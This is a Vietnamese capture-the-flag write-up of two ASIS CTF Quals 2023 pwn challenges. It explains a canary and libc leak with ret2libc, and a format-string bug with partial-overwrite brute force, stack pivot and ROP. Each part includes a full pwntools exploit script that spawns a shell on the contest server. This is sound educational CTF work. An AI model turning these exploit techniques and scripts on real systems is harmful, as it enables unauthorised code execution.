# ASIS CTF QUALS 2023 Writeup

## Đôi lời tâm sự
Author: SeaWind (J4ckP0t) 
Trong giải lần này thì mình đã giải được 2 bài pwn dễ trong tổng số 4 challenges về pwn. 

Đối với mình thì tuy 2 challenges còn lại rất khó nhưng mình phần nào cũng khá buồn khi mà thậm chí mình không thể có được ý tưởng giải bài cả :face_palm: 

Thôi cố gắng nâng cao dân trí về mảng pwn này vậy :hugging_face: 
## 1. Hipwn
- Đề bài: [Challenge_file](https://asisctf.com/tasks/hipwn_214be43d7118e14fc16aeb3adb34bc6f07d71810.txz)
- Solution:
Đầu tiên đề bài cho ta một loạt các file theo cấu trúc như sau:
```
/hipwn
- dockerfile
- flag.txt
/stuff
- chall
- xinetd.conf
```
Ta thấy được file challenge đã cho ta dockerfile, khá là tiện để ta có thể xác định được libc của chương trình khi chạy remote
Đầu tiên ta sẽ tiến hành kiểm tra các mitigations của file challenges sau:
![](https://hackmd.io/_uploads/Bk3R0Mal6.png)
Challenge này đã bật full mitigations rồi sẽ gây không ít khó khăn trong việc khai thác lỗ hổng.
Tiếp đến ta sẽ check mã giả của file challenge này thông qua IDA Pro.
![](https://hackmd.io/_uploads/H1qwyX6xT.png)
Ở đây ta thấy được rằng ta có thể leak được cả canary và cũng như libc thông qua hàm read và hàm puts khi mà hàm read sẽ không thêm kí tự NULL byte vào cuối input mà trong khi hàm puts sẽ tiến hành đọc cho đến khi gặp NULL byte thì dừng.
Để xác định được vị trí của canary cũng như vị trí của libc trong stack thì mình sẽ tiến hành đặt breakpoint ở hàm main sau khi hàm read.
![](https://hackmd.io/_uploads/ryUXcX6eT.png)
Ta có thể thấy được khoảng cách từ input của ta cho đến canary là 72 và 88 đối với rip chứa địa chỉ của libc.
Xác định được vị trí của rip với cả canary rồi thì ta sẽ tiến hành leak nó thông qua hàm read + put, và một điều cần lưu ý nữa là để leak được thì mình cần duy trì trong vòng lặp này, cho nên ta cần nhập 1337 khi chương trình hỏi "wanna do it again?"
Sau khi leak được cả canary và libc thì ta sẽ tiến hành sử dụng kỹ thuật ret2libc để tiến hành chiếm shell thôi
Vì ta đã leak được libc và offset giữa các hàm trong libc không đổi cho nên ta có thể tính offset ấy và thực hiện phép tính với libc ta vừa leak được ấy.
Và để chiếm được shell ta sẽ cần địa chỉ của 3 thứ:
1. Địa chỉ của hàm system(): = leak_libc + 0x26fd0
2. Địa chỉ của string /bin/sh: = leak_libc + 0x1ae908
3. Địa chỉ của gadgets pop rdi, ret: = (leak_libc-0x1d90)+0x23e5 
- Answer: Đây là script giải bài này của mình:
```python!=
from pwn import *
context.binary = "./chall"
#p = process()
p = remote("45.153.243.57",1337)
script = """
b*main+146
b*main+210
b*main+266
c
"""
#gdb.attach(p,script)
p.recv()
p.sendline(b'1337')
time.sleep(0.3)
p.recv()
p.sendline(cyclic(72))
time.sleep(0.3)
p.recvline()
p.recv(72)
leak_canary = u64(p.recv(8).ljust(8,b'\x00')) - 0xa
log.info("Leak canary: %s", hex(leak_canary))
print(p.recv())
p.sendline(b'1337')

p.recv()
p.sendline(b'1337')
time.sleep(0.3)

p.recv()
p.sendline(cyclic(0x58-1))
#p.interactive()
time.sleep(0.3)
p.recvline()
p.recv(87)
leak_libc = u64(p.recv(8).strip(b'\n').ljust(8,b'\x00'))
#p.interactive()
libc_base = leak_libc -0x1d90
sys_func = leak_libc + 0x26fd0
bin_sh = leak_libc + 0x1ae908
pop_rdi = libc_base + 0x23e5
log.info("Leak_libc: %s", hex(leak_libc))
p.recv()
p.sendline(b'1337')

p.recv()

p.sendline(b'1337')
payload = b'A'*72 + p64(leak_canary) + b'B'*8+ p64(pop_rdi+1) + p64(pop_rdi) + p64(bin_sh) + p64(sys_func)
p.recv()
p.sendline(payload)
p.recv()
p.sendline(b'0')
p.interactive()
```
:bulb: **==Flag: ASIS{so_you_know_how_to_pwn?!!!!}==**

## 2.Text-editor
- Đề bài: [Challenge_link](https://asisctf.com/tasks/text-editor_f5bd64fa398dc72dd79a91c369ee540781a8bdfd.txz)
- Solution: 
Đầu tiên ta sẽ phân tích cấu trúc của file challenge đã cho ta sẵn ngay từ đầu.
```
/text-editor
- dockerfile
- flag.txt
/stuff
- chall
- xinetd.conf
```
Cấu trúc của file cũng giống như file challenge hipwn, từ đó ta có thể xác định libc của mà remote challenge đang sử dụng cùng loại libc với trên máy của mình
Tiếp đến thì mình sẽ kiểm tra mitigations của file challenge này.
![](https://hackmd.io/_uploads/rJUP-Eal6.png)
Lại là một challenge với full mitigations nữa. Khá là khó cho việc khai thác lỗ hổng sau này.
Tiếp đến ta sẽ check mã giả của challenge này = IDA Pro.

![](https://hackmd.io/_uploads/ByQlGNaga.png)
Ta tiến hành phân tích luồn thực thi chương trình này thì chương trình có 3 options là:

**1. Edit text:** Đọc 264 bytes ký tự từ input của ta

![](https://hackmd.io/_uploads/Skg_GNpx6.png)

**2. Save text:** Copy 264 bytes input của ta vào trong stack:

![](https://hackmd.io/_uploads/SJJiMETe6.png)

**3. Exit:** Đơn giản là thoát khỏi vòng lặp và thoát chương trình
4. Ngoài ra còn một hàm nữa là hàm show_error() sẽ được gọi khi ta nhập sai options:

![](https://hackmd.io/_uploads/SJrl7Vpg6.png)

Khi đầu thoát tưởng chương trình nhìn như không có lỗ hổng để ta có thể khai thác. Nhưng mất một thời gian thì mình đã nhìn ra được lỗi format string ở ngay trong printf trong hàm show_error()
Cụ thể hơn thì ta sẽ tiến hành debug và đặt breakpoints ngay trước hàm printf để xem chuyện gì xảy ra.
![](https://hackmd.io/_uploads/rJaF846ga.png)
Ta sẽ thấy thanh RAX sẽ lấy địa chỉ của **0x555555558121** (text+256) và xem nó như địa chỉ và trỏ đến chuỗi string "Invalid choice!"
![](https://hackmd.io/_uploads/HyJ6UNae6.png)

Nhưng mà ta lại nhớ đến option 1 **edit text** cho phép ta ghi tổng cộng 264 bytes vào đây, cho nên ta có thể partial overwrite địa chỉ tại **<text+256>** 2 bytes đầu. Vì ta đã biết PIE đã bật nên địa chỉ sẽ luôn random ngoài trừ 3 nibbles cuối. Cho nên tại nibble thứ 4 của địa chỉ ta phải bruteforce với xác suất $1 \over 16$ để làm sao cho địa chỉ tại **<text+256>** sẽ trỏ đến chính địa chỉ chứa input của ta. Xác suất khá là cao đấy.
Đồng thời ta cũng thấy được lỗi format strings trong hàm printf nên ta sẽ lợi dụng nó để leak ra được địa chỉ của stack, địa chỉ của hàm main và quan trọng nhất là địa chỉ của libc.
![](https://hackmd.io/_uploads/rku75NTgp.png)
Ta thấy được địa chỉ của stack nằm tại offset 6, địa chỉ của hàm main tại offset 7 và địa chỉ của libc tại offset 45.
Sau khi thành công thì mình sẽ tiến hành dùng lỗi format string để tiến hành arbitrary write lên stack. 
![](https://hackmd.io/_uploads/HJGRREaxp.png)
Ở đây mình thấy sau khi thực hiện lệnh printf thì hàm sẽ tiến hành pop rbp và ret (tương đương với pop rip). Cho nên mình có ý tưởng là sử dụng kỹ thuật stack pivot, cụ thể là: 
1. Ta sẽ tiến hành ghi đè rbp của hàm là địa chỉ trỏ đến input của ta trên stack (mà bằng cách edit text + save text)
2. Ta sẽ ghi đè rip của ta là địa chỉ chứa gadget leave; ret có trong hàm main để stack pivot
3. Và cuối cùng là ta sẽ tiến hành build rop chain spam shell ngay trên chính input của ta luôn.
Còn về ROPchain thì vì ta đã leak được libc rồi nên mình có thể biết được địa chỉ của hàm system, string "/bin/sh" và gadgets pop rdi; ret.
- Answer: Đây là script giải bài của mình:
```python!=
from pwn import *
context.binary = "./chall"
#p = process()
script = """
b*show_error+8
c
"""
#gdb.attach(p,script)
#p = remote("45.153.243.57",13337)
def bruteforce(payload: bytes):
    status = ""
    msg = ""
    #gdb.attach(p,script)
    #a = p.recv()
    p.sendline(b'1')
    time.sleep(0.2)
    b =p.recv()
    p.send(payload)
    time.sleep(0.2)
    c = p.recv()
    #print(c)
    (p.recv())
    p.sendline(b'4')
    time.sleep(0.2)
    try:
        msg = p.recv()
        print(msg)
        if b'AAAA' in msg: status = "success"
    except Exception:
        status = 'fail'
    return status




while True:
    #p = process()
    p = remote("45.153.243.57", 13337)
    a = p.recv()
    (p.recv())
    payload = b'%6$p.%7$p.%45$p'.ljust(16,b'|')
    payload += b'A'*(256-len(payload))
    payload += b'\x20\x90'
    print(payload)
    status = bruteforce(payload)
    if status == 'success': break
    else: p.close()
(p.recv())
p.sendline(b'4')
leak = []
leak = p.recvuntil(b'|').strip(b'|').decode().split('.')
print(leak)
stack_leak = int(leak[0],base=16)
main_leak = int(leak[1],base=16)
libc_leak = int(leak[2],base=16)
log.info("Leak stack: %s", hex(stack_leak))
log.info("Main leak: %s", hex(main_leak))
log.info("Libc leak: %s", hex(libc_leak))


#################################################
#gdb.attach(p,script)
rbp_stack = stack_leak - 0x130
rip_stack = stack_leak - 0x128

sys_func = libc_leak + 0x26fd0
bin_sh = libc_leak + 0x1ae908
pop_rdi = (libc_leak -0x1d90) + 0x23e5
ret = pop_rdi + 1

destination = stack_leak-0xb0
destination = hex(destination)[-4:]
log.info("Destination: %s", destination)
destination = int(destination,base=16) -16
p.sendline(b'1')
p.recv()
payload2 = str('%16c%14$hhn%{}c%15$hn'.format(destination).ljust(32,'.')).encode() + p64(rip_stack) + p64(rbp_stack)
payload2 += cyclic(56) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys_func)
p.send(payload2)
time.sleep(0.2)
p.recv()
p.sendline(b'2')
time.sleep(0.2)
p.recv()
p.sendline(b'4')
p.interactive()
```
:bulb: **==Flag: ASIS{text_editing_has_never_been_so_fun_d1fd2}==**

